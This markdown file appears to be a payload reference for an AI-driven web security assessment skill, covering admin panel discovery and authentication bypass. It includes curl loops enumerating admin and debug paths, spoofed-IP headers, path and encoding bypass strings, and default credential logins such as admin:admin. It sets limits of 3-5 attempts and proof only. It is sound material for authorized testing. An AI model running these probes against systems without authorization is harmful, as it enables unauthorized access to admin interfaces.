# Admin Interface Discovery & Testing Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized AppSec assessment reference** only, helping identify admin interface exposure and authentication bypass vulnerability risk characteristics.
>
> - All testing is **limited to proving existence** of admin interfaces, no unauthorized access
> - Default credential testing references `default-credentials.md` and is limited to 3-5 attempts
> - Validation proves admin interface is accessible or bypassable, **no data access beyond proof**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings, SecLists

## Manual Testing

**Note: Maximum directory enumeration and 3-5 credential attempts per admin panel**

---

## Validation Objectives (Within Security Boundary)

Admin interface vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Admin Path Discovery | ✓ Enumerate common admin paths | - | Aggressive brute-force scanning |
| Authentication Bypass | ✓ Test bypass techniques | - | Access admin functionality |
| Default Credential Test | ✓ Test 3-5 default combos (see `default-credentials.md`) | - | Mass brute-force |
| Debug Console Access | ✓ Identify exposed debug consoles | - | Execute debug commands |
| Admin Panel Exposure | ✓ Confirm admin panel is accessible | - | Modify system configuration |

**Safe Validation Method**: Discover admin panels, test authentication bypass patterns, attempt 3-5 default credentials, document exposure without accessing admin functionality.

---

## Common Admin Path Enumeration

### Web Framework Admin Paths

```bash
# Check common admin paths
for path in admin administrator login dashboard console manager cpanel control panel admin/login admin/dashboard wp-admin wp-login.php phpmyadmin adminer.php; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path" 2>/dev/null)
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "[+] /$path -> $status"
  fi
done
```

### Framework-Specific Paths

```bash
# Spring Boot
for path in actuator actuator/env actuator/health actuator/info actuator/mappings actuator/beans actuator/configprops; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path" 2>/dev/null)
  echo "  /$path -> $status"
done

# Django
for path in admin admin/login admin/dashboard api/admin __debug__; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path" 2>/dev/null)
  echo "  /$path -> $status"
done

# Flask
for path in admin dashboard console debug graphiql; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path" 2>/dev/null)
  echo "  /$path -> $status"
done

# Laravel
for path in admin horizon telescope _ignition _debugbar nova; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path" 2>/dev/null)
  echo "  /$path -> $status"
done
```

### Common Management Interfaces

```bash
# Server management paths
for path in manager/html tomcat-manager manager/status server-status server-info jmx-console jolokia; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path" 2>/dev/null)
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "[+] /$path -> $status"
  fi
done

# Development/debug paths
for path in debug profiler _profiler trace error-telescope graphql graphiql playground apidoc swagger swagger-ui api-docs; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path" 2>/dev/null)
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "[+] /$path -> $status"
  fi
done
```

---

## Authentication Bypass Techniques

### IP-Based Access Control Bypass

```bash
# Test common header-based IP bypass
headers=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-For: localhost"
  "X-Real-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Forwarded-For: 198.51.100.10"
  "X-Forwarded-For: 192.0.2.10"
)

for header in "${headers[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/admin" -H "$header" 2>/dev/null)
  echo "[$status] $header"
done
```

### URL Path Bypass

```bash
# Path normalization bypass
/admin/./
/admin/../admin/
//admin/
/admin;
/admin%00
/admin%0a
/admin%2e
/admin%2f
/./admin
/admin..
/admin/?
```

### HTTP Method Bypass

```bash
# Test different HTTP methods
for method in GET POST PUT PATCH DELETE OPTIONS TRACE HEAD; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "https://target.com/admin" 2>/dev/null)
  echo "[$method] -> $status"
done
```

### Authentication Bypass via URL Encoding

```bash
# URL encoding bypass
/Admin/
/ADMIN/
/adm%69n/
/%61dmin/
/adm%6en/
/admin%2F
```

---

## Default Credential Testing

**Reference**: See `default-credentials.md` for comprehensive default credential lists.

```bash
# Test common admin credentials (max 3-5 combinations)
# HTTP Basic Auth
curl -s -o /dev/null -w "%{http_code}" -u admin:admin "https://target.com/admin/"
curl -s -o /dev/null -w "%{http_code}" -u admin:password "https://target.com/admin/"
curl -s -o /dev/null -w "%{http_code}" -u root:root "https://target.com/admin/"

# Form-based login (max 3-5 combinations)
curl -s -X POST "https://target.com/admin/login" \
  -d "username=admin&password=admin" -c cookies.txt -L
curl -s -X POST "https://target.com/admin/login" \
  -d "username=admin&password=password" -b cookies.txt -L
curl -s -X POST "https://target.com/admin/login" \
  -d "username=admin&password=admin123" -b cookies.txt -L
```

---

## Debug Console Access

### Common Debug Consoles

```bash
# Spring Boot Actuator
for endpoint in env health info mappings beans configprops heapdump threaddump metrics trace shutdown; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/actuator/$endpoint" 2>/dev/null)
  if [ "$status" == "200" ]; then
    echo "[+] /actuator/$endpoint -> $status (ACCESSIBLE)"
  fi
done

# Laravel Telescope
curl -s -o /dev/null -w "%{http_code}" "https://target.com/telescope/requests"

# Django Debug
curl -s "https://target.com/nonexistent_debug_test_404" | grep -i "django\|debug\|traceback"

# PHP DebugBar
curl -s -o /dev/null -w "%{http_code}" "https://target.com/_debugbar"

# GraphQL Playground/GraphiQL
curl -s -o /dev/null -w "%{http_code}" "https://target.com/graphiql"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'

# Kong/Vagrant Dev
curl -s -o /dev/null -w "%{http_code}" "https://target.com/debug"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/debug/vars"
```

---

## Admin Panel Specific Vulnerabilities

### Information Disclosure via Admin

```bash
# Check for version disclosure in admin panel
curl -s "https://target.com/admin" | grep -iE "version|powered by|build|release|v[0-9]"

# Check for user enumeration in adminlogin
curl -s "https://target.com/admin/login" -d "username=admin&password=wrong" | grep -iE "invalid password|wrong password|user not found|no account"

# Check for error disclosure in admin
curl -s "https://target.com/admin/login" -d "username='&password='" | grep -iE "error|exception|sql|trace"
```

### Admin Panel Response Analysis

```bash
# Analyze admin page response headers
curl -sI "https://target.com/admin" | grep -iE "server|x-powered-by|x-aspnet-version|set-cookie"

# Check for redirect patterns (302 vs 401 vs 403)
curl -sI "https://target.com/admin" -w "\nHTTP Code: %{http_code}\nRedirect: %{redirect_url}"

# Check for inconsistent access (different methods/paths)
curl -s "https://target.com/admin" -o admin_response.html
curl -s "https://target.com/admin/" -o admin_slash_response.html
diff admin_response.html admin_slash_response.html
```

---

## OWASP Category & CWE

| Category | Mapping |
|----------|---------|
| OWASP Web | A01:2021-Broken Access Control |
| OWASP Web | A07:2021-Identification and Authentication Failures |
| CWE | CWE-425: Direct Request ('Forced Browsing') |
| CWE | CWE-284: Improper Access Control |

---

## Analysis Process

1. Enumerate common admin paths based on fingerprint
2. Identify framework-specific admin interfaces
3. Test authentication bypass techniques (headers, methods, encoding)
4. Test 3-5 default credentials (see `default-credentials.md`)
5. Check for exposed debug consoles and management interfaces
6. Analyze admin panel response for information disclosure
7. **Stop validation*, document findings without accessing admin functionality

---

## Output

```markdown
## Vulnerability: Admin Interface Exposure / Auth Bypass

### Location
{URL} - {admin path}

### Type
{Path Discovery / Auth Bypass / Default Credentials / Debug Console / Info Disclosure}

### Evidence
- Admin path discovered: {path} -> {status code}
- Auth bypass method: {header/method/encoding}
- Default credentials work: {yes/no}
- Debug console accessible: {endpoint}

### Default Credential Test (if applicable)
- Tested combinations: {3-5 combos tested}
- Successful login: {yes/no}
- Immediate logout: {yes} (always logout after verification)

### Validation Result
- Admin panel accessible: {yes/no}
- Authentication bypass possible: {yes/no, method}
- Default credentials valid: {yes/no}
- Debug console exposed: {yes/no}

### Risk Level
{see severity rules}

### Severity Classification

Admin panel impact depends on **whether the panel can actually be entered and operated**. Finding only the panel path is information disclosure; being able to access without authentication / default credentials / bypass entry and execute administrative actions is what makes it high severity. 

| Actual case | Severity | Note |
|---------|------|------|
| Direct unauthenticated access to the admin panel + can executeadministrative actions | **High** | access control is completely missing |
| Default credentials can log in (admin/admin etc.)| **High** | see default-credentials.md, credentials are exploitable |
| Authentication bypass confirmed (access possible while bypassing authentication)| **High** | Authentication failure |
| Admin panel is reachable but requires authentication (returns a login page/401)| Low | Information disclosure only (admin surface existence disclosed)|
| Panel exists but functionality is limited/no sensitive operation | Low | limited impact |
| Only a suspected admin path is found (403/404)| Info/Low | Pending confirmation |

**Boundary coordination**: Default credentials testing / authentication bypass verification is Tier 2 (requires user authorization). Within the default scope, only observe whether the panel is reachable / whether it returns a login page — "can enter and perform operations = High" requires user authorization using test credentials. Do not report Critical based only on "finding the /admin path". 

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Access admin functionality | Only prove admin panel exists/is accessible |
| ❌ Modify system configuration | Do not change any settings |
| ❌ Mass brute-force | Maximum 3-5 credential attempts per service |
| ❌ Execute debug commands | Only document debug console existence |
| ❌ Enumerate all users | Do not enumerate beyond proof of access |
| ❌ Lateral movement | Do not use discovered access for further exploitation |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Only prove existence", "Default credentials limited to 3-5 attempts"
- `payloads/default-credentials.md` -> Default credential reference
- `README.md` -> Prohibited execution checklist
